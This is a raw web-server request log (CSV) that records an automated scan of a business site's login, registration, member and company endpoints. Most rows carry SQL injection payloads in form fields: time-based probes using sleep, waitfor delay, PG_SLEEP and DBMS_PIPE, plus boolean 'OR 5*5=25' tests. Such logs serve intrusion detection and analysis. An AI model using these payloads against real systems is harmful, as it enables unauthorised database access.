timestamp,ip,user_agent,path,method,input
2025-03-20 21:31:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""10\""XOR(1*if(now()=sysdate(),sleep(15),0))XOR\""Z"", ""tag"": [""7""]}"
2025-03-20 21:31:23,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 21:31:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:32:12,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:32:13,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 21:32:14,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""on""}"
2025-03-20 21:32:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:33:14,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIXtEbRT8at'; waitfor delay '0:0:15' --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:33:16,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1\"" OR 5*5=25 --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:34:17,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\""+(select(0)from(select(sleep(15)))v)+\""*/""], ""post_code"": ""94102""}"
2025-03-20 21:34:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:35:21,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""if(now()=sysdate(),sleep(15),0)"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:35:24,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIXqjzRj3ip') OR 603=(SELECT 603 FROM PG_SLEEP(15))--"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:36:39,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:38:29,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project""}"
2025-03-20 21:38:33,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""94102-1 waitfor delay '0:0:15' --""}"
2025-03-20 21:38:36,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""on0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z""}"
2025-03-20 21:39:36,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:41:43,118.26.36.18,Go-http-client/1.1,/,GET,
2025-03-20 21:41:51,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:41:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:42:40,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project""}"
2025-03-20 21:42:38,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""94102-1)) OR 885=(SELECT 885 FROM PG_SLEEP(15))--""}"
2025-03-20 21:42:48,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:42:51,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""-1 OR 5*5=25 --"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:43:39,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""-1 OR 5*5=25"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:43:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:44:39,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"", ""tag"": [""7""]}"
2025-03-20 21:44:51,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)""], ""post_code"": ""94102""}"
2025-03-20 21:45:43,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""if(now()=sysdate(),sleep(15),0)"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:45:46,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1\ufffd\ufffd\ufffd\ufffd%2527%2522\\'\\\"""", ""tag"": [""7""]}"
2025-03-20 21:45:50,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""on""}"
2025-03-20 21:46:49,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:47:45,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1 OR 5*5=25"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:47:57,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1\"" OR 5*5=25 or \""xZeWAojx\""=\"""", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:48:00,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1\ufffd\ufffd\ufffd\ufffd%2527%2522\\'\\\""""], ""post_code"": ""94102""}"
2025-03-20 21:48:51,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""(select DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15) from dual)""}"
2025-03-20 21:48:53,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""(select 198766*667891 from DUAL)""], ""post_code"": ""94102""}"
2025-03-20 21:48:55,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""on0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z""}"
2025-03-20 21:50:06,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""(select 198766*667891 from DUAL)""}"
2025-03-20 21:50:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:50:56,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:51:39,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:53:00,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""-1 OR 5*5=25""]}"
2025-03-20 21:53:07,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:53:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""-1' OR 5*5=25 or 'WAqTvoQC'='""]}"
2025-03-20 21:53:09,34.79.95.103,python-requests/2.32.3,/,GET,
2025-03-20 21:53:34,206.189.153.207,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",alive.php,GET,
2025-03-20 21:54:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Streetm5uzVVZJ' OR 566=(SELECT 566 FROM PG_SLEEP(15))--"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 21:54:14,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""-1 OR 5*5=25 --""}"
2025-03-20 21:54:40,172.31.43.200,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:55:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:55:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1\"" OR 5*5=25 or \""w3FOU3wJ\""=\"""", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
